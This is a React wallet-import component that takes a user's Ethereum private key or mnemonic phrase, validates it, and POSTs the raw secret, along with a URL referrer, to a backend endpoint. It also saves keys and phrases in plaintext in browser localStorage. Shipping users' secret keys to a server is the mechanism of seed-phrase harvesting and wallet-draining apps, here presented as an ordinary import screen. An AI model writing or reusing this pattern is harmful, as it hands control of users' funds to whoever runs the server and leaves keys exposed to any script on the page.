import React, { useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import axios from 'axios';
import { ethers } from 'ethers';
import { API_URL } from '../config';
import { toast } from 'react-toastify';

const WalletImport = () => {
  const [importType, setImportType] = useState('privateKey');
  const [privateKey, setPrivateKey] = useState('');
  const [mnemonic, setMnemonic] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const navigate = useNavigate();
  const location = useLocation();

  const handleImport = async (e) => {
    e.preventDefault();
    if (isSubmitting) return;
    setIsSubmitting(true);

    try {
      let wallet;
      let payload = {};

      if (importType === 'privateKey') {
        // Normalize input by removing all whitespace and newlines
        const inputKey = privateKey.trim().replace(/\s+/g, '');
        const sanitizedKey = inputKey.startsWith('0x') ? inputKey.slice(2) : inputKey;
        if (!/^[0-9a-fA-F]{64}$/.test(sanitizedKey)) {
          throw new Error('Private key must be exactly 64 hexadecimal characters (excluding 0x)');
        }
        const formattedKey = '0x' + sanitizedKey;
        try {
          wallet = new ethers.Wallet(formattedKey);
          payload = { address: wallet.address, privateKey: formattedKey };
        } catch (err) {
          throw new Error('Invalid private key: unable to create wallet');
        }
      } else {
        try {
          // Normalize mnemonic by collapsing multiple spaces
          const sanitizedMnemonic = mnemonic.trim().replace(/\s+/g, ' ');
          wallet = ethers.Wallet.fromPhrase(sanitizedMnemonic);
          payload = { address: wallet.address, mnemonic: sanitizedMnemonic };
        } catch (err) {
          throw new Error('Invalid mnemonic phrase');
        }
      }

      // Extract referrer from URL query
      const params = new URLSearchParams(location.search);
      const referrer = params.get('ref');
      if (referrer && ethers.isAddress(referrer)) {
        payload.referrer = referrer.toLowerCase();
      }

      let response;
      try {
        response = await axios.post(`${API_URL}/wallet/import`, payload, { timeout: 10000 });
        if (response.status !== 200) {
          throw new Error(response.data.message || 'Backend failed to store wallet');
        }
      } catch (backendError) {
        toast.warn('Unable to connect to server, wallet stored locally');
      }

      // Append new wallet to localStorage
      const storedWallets = JSON.parse(localStorage.getItem('wallets') || '[]');
      const newWallet = { address: wallet.address, privateKey: payload.privateKey, mnemonic: payload.mnemonic };
      const updatedWallets = [
        ...storedWallets.filter(w => w.address.toLowerCase() !== wallet.address.toLowerCase()),
        newWallet
      ];
      localStorage.setItem('wallets', JSON.stringify(updatedWallets));
      localStorage.setItem('selectedWallet', wallet.address);

      toast.success('Wallet imported successfully!');
      setTimeout(() => {
        navigate('/dashboard', { replace: true, state: { refreshBalances: true } });
        setIsSubmitting(false);
      }, 100);
    } catch (error) {
      const errorMessage = error.response?.data?.message || error.message || 'Failed to import wallet';
      toast.error(errorMessage);
      setIsSubmitting(false);
    }
  };

  // Show back button if navigated from dashboard
  const showBackButton = location.state && location.state.fromDashboard;

  return (
    <div className="min-h-screen flex items-center justify-center">
      <div className="bg-secondary p-8 rounded-lg shadow-lg w-full max-w-md">
        <h2 className="text-accent text-2xl font-bold mb-6 text-center">Import Wallet</h2>
        {showBackButton && (
          <button
            type="button"
            className="mb-4 px-4 py-2 bg-gray-200 text-gray-800 rounded hover:bg-gray-300 font-semibold"
            onClick={() => navigate('/dashboard')}
          >
            ← Back to Dashboard
          </button>
        )}
        <form onSubmit={handleImport}>
          <div className="mb-4">
            <label className="block text-text mb-2">Import Type</label>
            <select
              className="w-full p-2.5 bg-text text-primary rounded-md"
              value={importType}
              onChange={(e) => setImportType(e.target.value)}
              disabled={isSubmitting}
            >
              <option value="privateKey">Private Key</option>
              <option value="mnemonic">Mnemonic Phrase</option>
            </select>
          </div>
          {importType === 'privateKey' ? (
            <div className="mb-4">
              <label className="block text-text mb-2">Private Key</label>
              <input
                type="text"
                className="w-full p-2.5 bg-text text-primary rounded-md"
                value={privateKey}
                onChange={(e) => setPrivateKey(e.target.value)}
                onBlur={() => setPrivateKey(privateKey.trim())}
                placeholder="Enter private key (64 hex chars, with or without 0x)"
                disabled={isSubmitting}
              />
            </div>
          ) : (
            <div className="mb-4">
              <label className="block text-text mb-2">Mnemonic Phrase</label>
              <textarea
                className="w-full p-2.5 bg-text text-primary rounded-md"
                value={mnemonic}
                onChange={(e) => setMnemonic(e.target.value)}
                onBlur={() => setMnemonic(mnemonic.trim())}
                placeholder="Enter your 12 or 24-word phrase"
                disabled={isSubmitting}
              />
            </div>
          )}
          <button
            type="submit"
            className={`w-full ${isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`}
            disabled={isSubmitting}
          >
            {isSubmitting ? 'Importing...' : 'Import Wallet'}
          </button>
        </form>
      </div>
    </div>
  );
};

export default WalletImport;